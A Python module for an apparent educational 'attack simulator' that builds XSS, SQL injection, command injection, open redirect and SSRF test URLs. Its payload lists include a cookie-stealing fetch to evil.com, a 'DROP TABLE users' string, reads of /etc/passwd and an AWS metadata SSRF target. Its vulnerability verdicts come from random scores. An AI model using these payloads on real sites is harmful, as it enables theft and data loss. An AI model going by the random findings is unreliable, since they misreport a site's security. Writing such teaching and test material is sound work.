"""
Attack Simulator module for Cyber Wolf Security Analyzer.
This module provides simulated attack functionality to identify vulnerabilities in websites.
Note: This module simulates attacks for educational purposes only and does not perform actual exploits.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, List, Any, Tuple
import re
import logging
import random
import time
import json
import web_scraper

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Common attack payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' UNION SELECT 1,2,3 --",
    "') OR ('1'='1",
    "1; DROP TABLE users",
    "1' AND 1=0 UNION SELECT 1,2,'3"
]

COMMAND_INJECTION_PAYLOADS = [
    "| ls",
    "; ls",
    "$(ls)",
    "`ls`",
    "& ls",
    "&& ls",
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "& ping -c 4 evil.com"
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "evil.com",
    "javascript:fetch('https://evil.com?cookie='+document.cookie)"
]

SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://10.0.0.1",
    "http://192.168.1.1",
    "file:///etc/passwd"
]

def simulate_attack(url: str, attack_type: str, target_param: str = None) -> Dict[str, Any]:
    """
    Simulate an attack on a specific URL and parameter.
    
    Args:
        url (str): The URL to attack
        attack_type (str): Type of attack (XSS, SQLi, etc.)
        target_param (str, optional): Target parameter name
        
    Returns:
        Dict[str, Any]: Attack simulation results
    """
    logger.info(f"Simulating {attack_type} attack on {url}")
    
    result = {
        "attack_type": attack_type,
        "url": url,
        "target_param": target_param,
        "payloads_tested": [],
        "potentially_vulnerable": False,
        "evidence": [],
        "details": "",
        "simulation_only": True  # Always include this flag
    }
    
    try:
        # Parse URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If no target parameter specified but query parameters exist, test all of them
        if not target_param and query_params:
            target_params = list(query_params.keys())
        elif target_param:
            target_params = [target_param]
        else:
            # No parameters to test
            result["details"] = "No parameters found to test"
            return result
        
        # Select attack payloads based on attack type
        if attack_type == "XSS":
            payloads = XSS_PAYLOADS[:3]  # Limit to 3 for simulation
        elif attack_type == "SQLi":
            payloads = SQLI_PAYLOADS[:3]
        elif attack_type == "CommandInjection":
            payloads = COMMAND_INJECTION_PAYLOADS[:3]
        elif attack_type == "OpenRedirect":
            payloads = OPEN_REDIRECT_PAYLOADS[:3]
        elif attack_type == "SSRF":
            payloads = SSRF_PAYLOADS[:3]
        else:
            result["details"] = f"Unsupported attack type: {attack_type}"
            return result
        
        result["payloads_tested"] = payloads
        
        # Simulate attacks
        for param in target_params:
            logger.info(f"Testing parameter: {param}")
            
            for payload in payloads:
                # Create a new query dict with the payload
                new_query = query_params.copy()
                new_query[param] = [payload]
                
                # Reconstruct the URL
                new_query_str = urlencode(new_query, doseq=True)
                new_url_parts = list(parsed_url)
                new_url_parts[4] = new_query_str
                new_url = urlunparse(new_url_parts)
                
                # Log the attempt
                logger.info(f"Testing URL: {new_url}")
                
                # For simulation purposes only - not actually sending attack payloads
                result["evidence"].append({
                    "param": param,
                    "payload": payload,
                    "url": new_url,
                    "effectiveness": simulate_detection(attack_type, payload)
                })
                
                # Small delay for realism in simulation
                time.sleep(0.1)
        
        # Check if any evidence suggests vulnerability
        vulnerable_evidence = [e for e in result["evidence"] if e["effectiveness"] > 0.7]
        if vulnerable_evidence:
            result["potentially_vulnerable"] = True
            result["details"] = f"Potential {attack_type} vulnerability detected. This is a simulation only - no actual exploit attempted."
        
        return result
    
    except Exception as e:
        logger.error(f"Error simulating attack: {str(e)}")
        result["details"] = f"Error: {str(e)}"
        return result

def simulate_detection(attack_type: str, payload: str) -> float:
    """
    Simulate the detection effectiveness for demo purposes.
    
    Args:
        attack_type (str): Type of attack
        payload (str): The payload used
        
    Returns:
        float: Simulated detection score (0.0 to 1.0)
    """
    # This is for educational simulation only
    base_score = 0.5
    
    # Add randomness for demo purposes
    random_factor = random.uniform(-0.2, 0.3)
    
    # Adjust score based on payload complexity
    complexity_bonus = min(0.3, len(payload) / 100)
    
    # Common evasion techniques slightly increase score
    if "script" in payload.lower() and attack_type == "XSS":
        base_score += 0.1
    if "union select" in payload.lower() and attack_type == "SQLi":
        base_score += 0.15
    if "127.0.0.1" in payload and attack_type == "SSRF":
        base_score += 0.2
    
    final_score = min(0.95, max(0.1, base_score + random_factor + complexity_bonus))
    return final_score

def automatic_attack_scan(url: str) -> Dict[str, Any]:
    """
    Perform automatic attack simulation on a URL.
    
    Args:
        url (str): The URL to scan
        
    Returns:
        Dict[str, Any]: Comprehensive scan results
    """
    logger.info(f"Starting automatic attack scan for: {url}")
    
    result = {
        "target_url": url,
        "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "attack_surface": {},
        "simulated_attacks": [],
        "identified_vulnerabilities": [],
        "scan_summary": "",
        "educational_only": True
    }
    
    try:
        # Analyze the attack surface
        logger.info("Analyzing attack surface...")
        result["attack_surface"] = web_scraper.analyze_attack_surface(url)
        
        # Identify potential parameters to test
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If URL has query parameters, test them
        if query_params:
            logger.info(f"Found {len(query_params)} parameters to test")
            
            # Test each parameter with different attack types
            for param in query_params:
                # Try XSS
                xss_result = simulate_attack(url, "XSS", param)
                result["simulated_attacks"].append(xss_result)
                
                # Try SQLi
                sqli_result = simulate_attack(url, "SQLi", param)
                result["simulated_attacks"].append(sqli_result)
                
                # Additional attacks based on parameter name
                if any(keyword in param.lower() for keyword in ["url", "redirect", "link", "goto"]):
                    redirect_result = simulate_attack(url, "OpenRedirect", param)
                    result["simulated_attacks"].append(redirect_result)
                
                if any(keyword in param.lower() for keyword in ["file", "path", "doc", "resource"]):
                    ssrf_result = simulate_attack(url, "SSRF", param)
                    result["simulated_attacks"].append(ssrf_result)
        else:
            logger.info("No URL parameters found, scanning form inputs...")
            
            # If no query parameters, check for forms
            if result["attack_surface"]["input_fields"]:
                logger.info(f"Found {len(result['attack_surface']['input_fields'])} input fields")
                result["simulated_attacks"].append({
                    "attack_type": "form_analysis",
                    "url": url,
                    "details": "Form inputs identified - recommend manual testing",
                    "input_fields": result["attack_surface"]["input_fields"]
                })
            else:
                logger.info("No input fields found")
                result["simulated_attacks"].append({
                    "attack_type": "surface_analysis",
                    "url": url,
                    "details": "No parameters or input fields found for automated testing"
                })
        
        # Process simulated attacks to identify vulnerabilities
        for attack in result["simulated_attacks"]:
            if attack.get("potentially_vulnerable", False):
                vuln = {
                    "type": attack["attack_type"],
                    "url": attack["url"],
                    "parameter": attack.get("target_param", "N/A"),
                    "evidence": attack.get("evidence", []),
                    "severity": get_attack_severity(attack["attack_type"]),
                    "description": get_attack_description(attack["attack_type"]),
                    "remediation": get_attack_remediation(attack["attack_type"])
                }
                result["identified_vulnerabilities"].append(vuln)
        
        # Generate summary
        result["scan_summary"] = generate_scan_summary(result)
        
        return result
    
    except Exception as e:
        logger.error(f"Error in automatic attack scan: {str(e)}")
        result["scan_summary"] = f"Error during scan: {str(e)}"
        return result

def get_attack_severity(attack_type: str) -> str:
    """Get the severity rating for an attack type."""
    severity_map = {
        "XSS": "High",
        "SQLi": "Critical",
        "CommandInjection": "Critical",
        "OpenRedirect": "Medium",
        "SSRF": "High",
        "form_analysis": "Info",
        "surface_analysis": "Info"
    }
    return severity_map.get(attack_type, "Medium")

def get_attack_description(attack_type: str) -> str:
    """Get a description for an attack type."""
    description_map = {
        "XSS": "Cross-Site Scripting allows attackers to inject malicious scripts that execute in victims' browsers, potentially stealing cookies, session tokens, or other sensitive information.",
        "SQLi": "SQL Injection allows attackers to interfere with database queries, potentially exposing, modifying, or deleting data, or escalating privileges.",
        "CommandInjection": "Command Injection allows attackers to execute arbitrary commands on the host operating system, potentially gaining complete control of the server.",
        "OpenRedirect": "Open Redirect vulnerabilities allow attackers to redirect users to malicious websites, often used in phishing attacks.",
        "SSRF": "Server-Side Request Forgery allows attackers to induce the server to make requests to internal resources, potentially exposing sensitive information or accessing restricted services.",
        "form_analysis": "Analysis of form inputs that could be vulnerable to various attacks.",
        "surface_analysis": "General analysis of the attack surface of the application."
    }
    return description_map.get(attack_type, "Unknown attack type")

def get_attack_remediation(attack_type: str) -> str:
    """Get remediation steps for an attack type."""
    remediation_map = {
        "XSS": "1. Implement proper output encoding\n2. Use Content-Security-Policy headers\n3. Validate and sanitize all user inputs\n4. Use modern frameworks that automatically escape output",
        "SQLi": "1. Use parameterized queries or prepared statements\n2. Implement ORM frameworks\n3. Apply strict input validation\n4. Limit database user privileges\n5. Use stored procedures",
        "CommandInjection": "1. Avoid calling system commands with user input\n2. If necessary, implement a strict allowlist of permitted values\n3. Use APIs instead of command-line calls\n4. Run commands with minimal privileges",
        "OpenRedirect": "1. Implement a URL allowlist for redirects\n2. Validate full URLs before redirecting\n3. Use relative path redirects when possible\n4. Don't include user input in redirect targets",
        "SSRF": "1. Implement a URL allowlist\n2. Block access to internal IP ranges\n3. Disable unnecessary URL schemas (file://, etc.)\n4. Use a dedicated service for remote resource access",
        "form_analysis": "1. Implement proper input validation for all form fields\n2. Use CSRF tokens for all forms\n3. Limit input length and formats\n4. Consider implementing rate limiting",
        "surface_analysis": "1. Reduce attack surface by removing unnecessary features and endpoints\n2. Implement proper access controls\n3. Use security headers\n4. Keep all software updated"
    }
    return remediation_map.get(attack_type, "Unknown attack type")

def generate_scan_summary(scan_result: Dict[str, Any]) -> str:
    """Generate a summary of the scan results."""
    vulns = scan_result.get("identified_vulnerabilities", [])
    attacks = scan_result.get("simulated_attacks", [])
    
    if not attacks:
        return "No attacks were simulated. Scan may have failed."
    
    if not vulns:
        return f"Automatic attack scan completed. Simulated {len(attacks)} attacks. No potential vulnerabilities were identified in this simulation."
    
    # Count vulnerabilities by severity
    severity_counts = {}
    for vuln in vulns:
        severity = vuln.get("severity", "Unknown")
        if severity in severity_counts:
            severity_counts[severity] += 1
        else:
            severity_counts[severity] = 1
    
    summary = f"Automatic attack scan completed. Simulated {len(attacks)} attacks and identified {len(vulns)} potential vulnerabilities: "
    summary += ", ".join([f"{count} {severity}" for severity, count in severity_counts.items()])
    
    summary += "\n\nThis is an educational simulation only - no actual exploits were attempted."
    return summary